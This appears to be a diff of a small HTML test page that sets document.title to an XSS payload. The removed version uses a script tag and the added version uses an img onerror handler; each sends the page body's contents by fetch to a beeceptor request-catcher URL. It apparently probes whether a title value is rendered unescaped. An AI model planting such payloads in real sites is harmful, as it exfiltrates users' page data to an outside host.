@@ -5,15 +5,15 @@
 <!--[if gt IE 8]>      <html class="no-js"> <!--<![endif]-->
 <html>
   <head> </head>
+
   <body id="headercheck">
     Hey New Name
-    <script type="text/javascript">
-      // document.title = document.getElementsByTagName("body")[0].innerHTML;
-      // console.log(document.title);
-      document.title = "<script> fetch('https://catchtag.free.beeceptor.com/' + document.getElementsByTagName('body')[0].innerHTML).then((response) => response.json()).then((data) => console.log(data));</script>"
-      // <!-- fetch("https://catchtag.free.beeceptor.com/" + document.title)
-      //   .then((response) => response.json())
-      //   .then((data) => console.log(data)); -->
+    <script>
+      // var data = document.getElementsByTagName("body")[0].innerHTML;
+      document.title =
+        '<img src= "#" onerror=console.log(fetch(`https://catchtag.free.beeceptor.com/${document.getElementsByTagName("body")[0].innerHTML}`))>';
+      // document.getElementsByTagName("body")[0].innerHTML
     </script>
   </body>
 </html>
+<!-- // fetch("https://catchtag.free.beeceptor.com/" +  -->
